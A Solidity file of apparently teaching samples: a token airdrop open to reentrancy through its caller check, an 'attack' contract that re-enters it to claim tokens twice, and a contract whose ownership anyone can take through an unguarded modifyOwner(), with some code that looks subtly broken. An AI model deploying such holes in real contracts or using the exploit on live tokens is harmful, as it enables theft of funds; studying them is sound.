pragma solidity ^0.5.0;

contract ModifierEntrancy {
    mapping (address => uint) public tokenBalance;
    string constant name = "Nu Token";

    //If a contract has a zero balance and supports the token give them some token
    function airDrop()  public{
        require(hasNoBalance(msg.sender));
        require(supportsToken(msg.sender));
        tokenBalance[msg.sender] += 20;
    }

    //Checks that the contract responds the way we want
    function supportsToken(address addr) external view returns (bool){
        return(keccak256(abi.encodePacked("Nu Token")) == Bank(addr).supportsToken());
    }
    //Checks that the caller has a zero balance
    function hasNoBalance(address addr) external view returns(bool) {
        return(tokenBalance[addr] == 0);
    }
}

contract Bank{
    function supportsToken() external pure returns(bytes32){
        return(keccak256(abi.encodePacked("Nu Token")));
    }
}

contract attack{ //An example of a contract that breaks the contract above.
    bool hasBeenCalled;
    function supportsToken() external returns(bytes32){
        if(!hasBeenCalled){
            hasBeenCalled = true;
            ModifierEntrancy(msg.sender).airDrop();
        }
        return(keccak256(abi.encodePacked("Nu Token")));
    }
    function call(address token) public{
        ModifierEntrancy(token).airDrop();
    }
}
// https://ethereum.stackexchange.com/questions/57350/can-external-functions-within-the-contract-be-modified-with-a-modifier-without-th/57361#57361
contract A{
    address public owner;
    modifier onlyOwner {
      require(msg.sender == owner);
      _;
    }
    function deposit() public payable onlyOwner {
      owner.transfer(msg.value);
    }
    function sendEther(address payable receiver) public onlyOwner {
      receiver.transfer(msg.value);
    }
    function modifyOwner() public {
      owner = msg.sender;
    }
}

contract B{
    A public a;
    function callSendEther(address payable receiver) public {
        a.sendEther(receiver);
    }
    function callDeposit(address payable receiver) public {
        a.deposit.value(1 ether)();
    }
}

